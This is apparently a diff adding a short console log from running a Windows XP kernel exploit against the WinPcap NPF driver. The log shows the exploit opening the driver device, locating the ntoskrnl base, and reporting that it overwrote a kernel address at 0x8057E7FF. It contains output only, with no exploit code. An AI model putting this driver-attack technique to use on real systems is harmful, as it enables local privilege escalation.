@@ -1,0 +1,19 @@
+Searching for a valid Interface ...
+AQUI
+\\.\NPF_{CCFBB7C9-478A-4837-9A36-302F56F7CEF5}
+generating NPF Device Name (:
+NPF Device name generated! : \\.\NPF_{CCFBB7C9-478A-4837-9A36-302F56F7CEF5}
+Memory allocated at 00570000
+Memory mapping filled! ...
+Device \\.\NPF_{CCFBB7C9-478A-4837-9A36-302F56F7CEF5} succesfully opened!
+ntoskrnl.exe
+NTOSKRNL Base found at 0X804D8000
+System identified as Windows XP
+First time reading ... bytes returned 0x10
+OutBuffer[i] = 0
+OutBuffer[i] = 0
+OutBuffer[i] = 0
+OutBuffer[i] = 0
+Launching exploit ...
+Overwritting NTOSKRNL switch at -> 0X8057E7FF
+Press any key to continue
